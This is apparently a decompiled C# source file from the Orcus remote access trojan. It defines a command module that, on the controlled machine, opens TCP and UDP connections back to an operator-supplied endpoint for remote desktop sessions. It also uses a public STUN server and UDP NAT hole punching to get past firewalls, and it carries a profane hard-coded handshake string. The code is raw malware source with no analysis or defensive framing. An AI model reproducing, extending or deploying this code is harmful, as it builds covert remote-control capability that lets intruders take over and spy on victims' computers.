using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Lidgren.Network;
using Orcus.Plugins;
using Orcus.Shared.Commands.ConnectionInitializer;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.Utilities;
using Orcus.Shared.Utilities.STUN;

namespace Orcus.Commands.ConnectionInitializer;

public class ConnectionInitializerCommand : Command, IConnectionInitializer
{
	private readonly DtpProcessor _dtpProcessor;

	private readonly Dictionary<Guid, IConnection> _connections;

	private readonly object _ipAddressLock = new object();

	private IPAddress _localAddress;

	private IPAddress LocalAddress
	{
		get
		{
			if (_localAddress == null)
			{
				lock (_ipAddressLock)
				{
					if (_localAddress == null)
					{
						_localAddress = NetworkUtilities.GetLanIp();
					}
				}
			}
			return _localAddress;
		}
	}

	public ConnectionInitializerCommand()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		_dtpProcessor = new DtpProcessor((object)this);
		_connections = new Dictionary<Guid, IConnection>();
	}

	public override void Dispose()
	{
		((Command)this).Dispose();
		foreach (KeyValuePair<Guid, IConnection> connection in _connections)
		{
			_connections.Remove(connection.Key);
			((IDisposable)connection.Value).Dispose();
		}
	}

	[DataTransferProtocolMethod(new Type[] { })]
	public RemoteConnectionInformation GetCoreInformation(ConnectionProtocol connectionProtocol)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Invalid comparison between Unknown and I4
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		RemoteConnectionInformation val = new RemoteConnectionInformation();
		val.set_LocalIpAddress(NetworkUtilities.GetLanIp());
		RemoteConnectionInformation val2 = val;
		if ((connectionProtocol & 1) == 1)
		{
			val2.set_UdpConnectionInformation(new UdpConnectionInformation());
			try
			{
				IPAddress lanIp = NetworkUtilities.GetLanIp();
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
				socket.Bind(new IPEndPoint(lanIp, 3478));
				IPEndPoint iPEndPoint = default(IPEndPoint);
				if (SessionTraversalUtilitiesForNAT.IsHolePunchingPossible(socket, ref iPEndPoint))
				{
					val2.get_UdpConnectionInformation().set_IsHolePunchingPossible(true);
				}
				socket.Close();
				return val2;
			}
			catch (Exception)
			{
				return val2;
			}
		}
		return val2;
	}

	[DataTransferProtocolMethod(new Type[] { })]
	public Guid InitializeUdpLanConnection(IPEndPoint serverEndPoint)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		NetPeerConfiguration val = new NetPeerConfiguration("RemoteDesktop");
		val.set_LocalAddress(LocalAddress);
		NetClient val2 = new NetClient(val);
		NetOutgoingMessage val3 = ((NetPeer)val2).CreateMessage();
		((NetBuffer)val3).Write("GARYFUCKINGWASHINGTON");
		((NetPeer)val2).SendUnconnectedMessage(val3, serverEndPoint);
		Thread.Sleep(200);
		UdpLanConnection value = new UdpLanConnection(val2, serverEndPoint);
		Guid guid = Guid.NewGuid();
		_connections.Add(guid, (IConnection)(object)value);
		return guid;
	}

	[DataTransferProtocolMethod(new Type[] { })]
	public Guid InitializeTcpLanConnection(IPEndPoint serverEndPoint)
	{
		TcpClient tcpClient = new TcpClient();
		IAsyncResult asyncResult = tcpClient.BeginConnect(serverEndPoint.Address, serverEndPoint.Port, null, null);
		if (!asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5.0)))
		{
			throw new Exception("Failed to connect.");
		}
		tcpClient.EndConnect(asyncResult);
		TcpConnection value = new TcpConnection(tcpClient);
		Guid guid = Guid.NewGuid();
		_connections.Add(guid, (IConnection)(object)value);
		return guid;
	}

	[DataTransferProtocolMethod(new Type[] { })]
	public UdpHolePunchingFeedback InitializeUdpPunchHolingConnection()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		NetPeerConfiguration val = new NetPeerConfiguration("RemoteDesktopUdpHolePunching");
		val.set_LocalAddress(LocalAddress);
		val.EnableMessageType((NetIncomingMessageType)2048);
		NetClient val2 = new NetClient(val);
		((NetPeer)val2).InitializeSocket();
		bool blocking = ((NetPeer)val2).get_Socket().Blocking;
		((NetPeer)val2).get_Socket().Blocking = true;
		STUN_Result val3 = SessionTraversalUtilitiesForNAT.TestStun("stun.l.google.com", 19302, ((NetPeer)val2).get_Socket());
		((NetPeer)val2).get_Socket().Blocking = blocking;
		if (!SessionTraversalUtilitiesForNAT.IsHolePunchingPossible(val3.get_NetType()))
		{
			throw new Exception(string.Concat("STUN server responded with: ", val3.get_NetType(), ". Hole punching not possible"));
		}
		((NetPeer)val2).InitializeLoop();
		Guid guid = Guid.NewGuid();
		_connections.Add(guid, (IConnection)(object)new UdpHolePunchingConnection(val2));
		UdpHolePunchingFeedback val4 = new UdpHolePunchingFeedback();
		val4.set_ConnectionGuid(guid);
		val4.set_PublicEndPoint(val3.get_PublicEndPoint());
		return val4;
	}

	[DataTransferProtocolMethod(new Type[] { })]
	public void ConnectUdpPunchHolingConnection(Guid connectionGuid, IPEndPoint remoteEndPoint)
	{
		((NetPeer)((UdpHolePunchingConnection)(object)_connections[connectionGuid]).NetClient).NatIntroduction(false, remoteEndPoint, (IPEndPoint)null, "GARYFUCKINGWASHINGTON");
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		ConnectionInitializerCommunication val = (ConnectionInitializerCommunication)parameter[0];
		if ((int)val != 0)
		{
			throw new ArgumentOutOfRangeException();
		}
		byte[] data = _dtpProcessor.Receive(parameter, 1);
		connectionInfo.UnsafeResponse((Command)(object)this, data.Length + 1, (Action<BinaryWriter>)delegate(BinaryWriter writer)
		{
			writer.Write((byte)1);
			writer.Write(data);
		});
	}

	protected override uint GetId()
	{
		return 32u;
	}

	public IConnection TakeConnection(Guid guid)
	{
		if (_connections.TryGetValue(guid, out var value))
		{
			_connections.Remove(guid);
			return value;
		}
		return null;
	}
}
